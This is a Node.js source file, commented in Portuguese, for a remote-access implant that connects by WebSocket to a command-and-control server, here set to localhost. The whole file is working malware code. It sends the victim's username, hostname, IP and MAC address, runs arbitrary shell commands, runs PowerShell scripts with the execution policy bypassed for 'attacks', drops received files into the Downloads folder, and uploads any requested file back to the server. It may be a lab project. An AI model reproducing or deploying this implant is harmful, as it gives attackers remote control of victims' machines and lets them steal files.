const WebSocket = require("ws");
const { exec } = require("child_process");
const zlib = require("zlib");
const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync } = require("child_process");
const { networkInterfaces } = require("os");

// Armazenar chunks de arquivo em memória
let fileChunks = [];
let currentFileInfo = null;

// Obter informações do sistema
function getSystemInfo() {
    try {
        const interfaces = networkInterfaces();
        let macAddress = "N/A";
        let ipAddress = "N/A";

        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                // Pegar primeiro IP não localhost
                if (iface.family === "IPv4" && !iface.address.startsWith("127")) {
                    ipAddress = iface.address;
                    macAddress = iface.mac;
                    break;
                }
            }
            if (ipAddress !== "N/A") break;
        }

        // Pegar username
        let username = process.env.USERNAME || process.env.USER || "unknown";
        
        return {
            username: username,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus().length,
            totalMemory: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + " GB",
            freeMemory: Math.round(os.freemem() / (1024 * 1024 * 1024)) + " GB",
            macAddress: macAddress,
            ipAddress: ipAddress,
            uptime: Math.round(os.uptime() / 3600) + " h"
        };
    } catch (e) {
        return { error: e.message };
    }
}

const connect = () => {
    const ws = new WebSocket("ws://localhost:3000");

    ws.on("open", () => {
        console.log("[+] Implant conectado ao servidor C2");
        const systemInfo = getSystemInfo();
        ws.send(JSON.stringify({ 
            type: 'systeminfo',
            data: systemInfo
        }));
    });

    ws.on("message", (data) => {
        try {
            // Tentar parsear como JSON
            const message = JSON.parse(data.toString());
            handleMessage(message, ws);
        } catch (e) {
            // Se não for JSON, tratar como comando simples (compatibilidade com versão anterior)
            const command = data.toString();
            console.log(`[CMD] ${command}`);
            executeCommand(command, ws);
        }
    });

    ws.on("error", (err) => {
        console.error("[ERROR]", err.message);
    });

    ws.on("close", () => {
        console.log("[-] Desconectado do servidor, reconectando em 5s...");
        setTimeout(connect, 5000);
    });
};

// Processar diferentes tipos de mensagens
function handleMessage(message, ws) {
    switch (message.type) {
        case 'exec':
        case 'command':
            console.log(`[CMD] ${message.command}`);
            executeCommand(message.command, ws);
            break;

        case 'file_start':
            console.log(`[FILE] Iniciando recebimento: ${message.originalName}`);
            fileChunks = [];
            currentFileInfo = {
                filename: message.filename,
                totalChunks: message.totalChunks,
                originalName: message.originalName,
                totalSize: message.totalSize,
                receivedChunks: 0
            };
            break;

        case 'file_chunk':
            console.log(`[CHUNK] ${message.chunkIndex + 1}/${message.totalChunks}`);
            const chunkBuffer = Buffer.from(message.data, 'base64');
            fileChunks.push(chunkBuffer);
            currentFileInfo.receivedChunks++;
            
            // Calcular progresso
            const progress = Math.round((currentFileInfo.receivedChunks / currentFileInfo.totalChunks) * 100);
            console.log(`[PROGRESS] ${progress}%`);
            break;

        case 'file_end':
            console.log(`[FILE_END] Descompactando ${message.filename}...`);
            decompressAndSaveFile(ws);
            break;

        case 'download_file':
            console.log(`[DOWNLOAD] Preparando arquivo: ${message.filepath} (downloadId: ${message.downloadId})`);
            downloadFileToServer(message.filepath, ws, message.downloadId);
            break;

        case 'execute-script':
            console.log(`[SCRIPT] Executando script PowerShell (ataques: ${message.attacks?.join(', ') || 'unknown'})`);
            executeScript(message.command, message.isAttack, ws);
            break;

        case 'dir':
            executeCommand('dir', ws);
            break;

        default:
            console.log(`[UNKNOWN] Tipo desconhecido: ${message.type}`);
    }
}

// Executar script PowerShell
function executeScript(script, isAttack, ws) {
    const scriptPath = path.join(os.tmpdir(), `script_${Date.now()}.ps1`);
    
    try {
        // Escrever script em arquivo temporário
        fs.writeFileSync(scriptPath, script, 'utf8');
        
        // Executar PowerShell com bypass de execução
        const command = `powershell.exe -NoProfile -ExecutionPolicy Bypass -File "${scriptPath}"`;
        exec(command, { encoding: 'utf8', maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
            const output = error ? stderr || error.message : stdout;
            const result = output || (isAttack ? "Ataque executado" : "Script executado");
            
            console.log(`[SCRIPT_OUTPUT] ${result}`);
            
            // Enviar resultado
            ws.send(JSON.stringify({
                type: 'output',
                command: `Script ${isAttack ? 'ATTACK' : 'CUSTOM'}`,
                output: result,
                isAttack: isAttack
            }));
            
            // Limpeza
            try {
                fs.unlinkSync(scriptPath);
            } catch (e) {
                console.error(`[CLEANUP] Erro ao deletar script: ${e.message}`);
            }
        });
    } catch (e) {
        console.error(`[SCRIPT_ERROR] ${e.message}`);
        ws.send(JSON.stringify({
            type: 'output',
            command: 'Script Error',
            output: `Erro ao executar script: ${e.message}`,
            isAttack: isAttack
        }));
        
        // Tentar limpeza
        try {
            if (fs.existsSync(scriptPath)) {
                fs.unlinkSync(scriptPath);
            }
        } catch (e) { }
    }
}

// Executar comando e enviar saída de volta
function executeCommand(command, ws) {
    exec(command, { encoding: 'utf8', maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
        const output = error ? stderr || error.message : stdout;
        const result = output || "Comando executado sem retorno";
        
        console.log(`[OUTPUT] Enviando resposta...`);
        
        // Enviar como JSON estruturado
        ws.send(JSON.stringify({
            type: 'output',
            command: command,
            data: result,
            timestamp: new Date().toISOString()
        }));
    });
}

// Descomprimir arquivo concatenado de chunks
function decompressAndSaveFile(ws) {
    if (!currentFileInfo || fileChunks.length === 0) {
        console.error("[ERROR] Nenhum arquivo para descomprimir");
        return;
    }

    // Concatenar todos os chunks
    const compressedBuffer = Buffer.concat(fileChunks);
    console.log(`[DECOMPRESS] Buffer comprimido: ${compressedBuffer.length} bytes`);

    // Descomprimir
    zlib.gunzip(compressedBuffer, (err, decompressed) => {
        if (err) {
            console.error("[ERROR] Erro ao descomprimir:", err.message);
            ws.send(JSON.stringify({
                type: 'status',
                message: `Erro ao descomprimir: ${err.message}`
            }));
            fileChunks = [];
            currentFileInfo = null;
            return;
        }

        // Salvar arquivo descomprimido no temp ou Downloads
        const tempDir = path.join(os.homedir(), 'Downloads');
        const outputPath = path.join(tempDir, currentFileInfo.originalName);

        fs.writeFile(outputPath, decompressed, (writeErr) => {
            if (writeErr) {
                console.error("[ERROR] Erro ao salvar arquivo:", writeErr.message);
                ws.send(JSON.stringify({
                    type: 'status',
                    message: `Erro ao salvar: ${writeErr.message}`
                }));
            } else {
                console.log(`[SUCCESS] Arquivo salvo: ${outputPath}`);
                ws.send(JSON.stringify({
                    type: 'status',
                    message: `Arquivo recebido e salvo em ${outputPath}`,
                    filename: outputPath,
                    size: decompressed.length
                }));
            }
        });

        // Limpar buffers
        fileChunks = [];
        currentFileInfo = null;
    });
}

// Upload de arquivo do implant para o server
function downloadFileToServer(filepath, ws, downloadId) {
    fs.readFile(filepath, (err, data) => {
        if (err) {
            console.error("[ERROR] Erro ao ler arquivo:", err.message);
            ws.send(JSON.stringify({
                type: 'status',
                message: `Erro ao ler arquivo: ${err.message}`
            }));
            return;
        }

        console.log(`[FILE] Lido arquivo: ${data.length} bytes`);

        // Comprimir arquivo
        zlib.gzip(data, (compressErr, compressed) => {
            if (compressErr) {
                console.error("[ERROR] Erro ao comprimir:", compressErr.message);
                ws.send(JSON.stringify({
                    type: 'status',
                    message: `Erro ao comprimir: ${compressErr.message}`
                }));
                return;
            }

            console.log(`[COMPRESS] Arquivo comprimido: ${compressed.length} bytes`);

            // Enviar em chunks de 16KB
            const CHUNK_SIZE = 16384;
            let offset = 0;
            const totalChunks = Math.ceil(compressed.length / CHUNK_SIZE);
            const filename = path.basename(filepath);

            // Enviar metadados do arquivo primeiro
            ws.send(JSON.stringify({
                type: 'download_start',
                downloadId: downloadId,
                filename: filename,
                totalChunks: totalChunks,
                originalPath: filepath,
                totalSize: compressed.length,
                machineId: downloadId ? downloadId.split('_')[0] : null
            }));

            console.log(`[DOWNLOAD] Iniciando envio de ${totalChunks} chunks`);

            const sendChunk = () => {
                if (offset >= compressed.length) {
                    // Enviar comando para finalizar
                    ws.send(JSON.stringify({
                        type: 'download_end',
                        downloadId: downloadId,
                        filename: filename
                    }));
                    console.log(`[DOWNLOAD] Upload de ${filename} concluído!`);
                    return;
                }

                const chunkData = compressed.slice(offset, offset + CHUNK_SIZE);
                ws.send(JSON.stringify({
                    type: 'download_chunk',
                    downloadId: downloadId,
                    chunkIndex: Math.floor(offset / CHUNK_SIZE),
                    totalChunks: totalChunks,
                    filename: filename,
                    data: chunkData.toString('base64')
                }));

                offset += CHUNK_SIZE;
                console.log(`[DOWNLOAD] Chunk ${Math.floor(offset / CHUNK_SIZE)}/${totalChunks}`);

                // Enviar próximo chunk após pequeno delay
                setImmediate(sendChunk);
            };

            sendChunk();
        });
    });
}

// Iniciar conexão
connect();